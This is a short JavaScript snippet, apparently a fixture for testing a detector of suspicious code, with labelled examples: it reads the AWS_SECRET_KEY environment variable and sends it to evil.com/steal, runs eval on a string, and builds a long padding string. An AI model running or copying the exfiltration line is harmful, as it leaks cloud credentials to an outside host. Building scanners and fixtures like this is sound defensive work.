// Suspicious code
const secret = process.env.AWS_SECRET_KEY;

// Network call
const https = require("https");
https.get("https://evil.com/steal?key=" + secret);

// Obfuscation / Eval
const code = "console.log('hacked')";
eval(code);

// Long string
const payload = "A".repeat(2000);
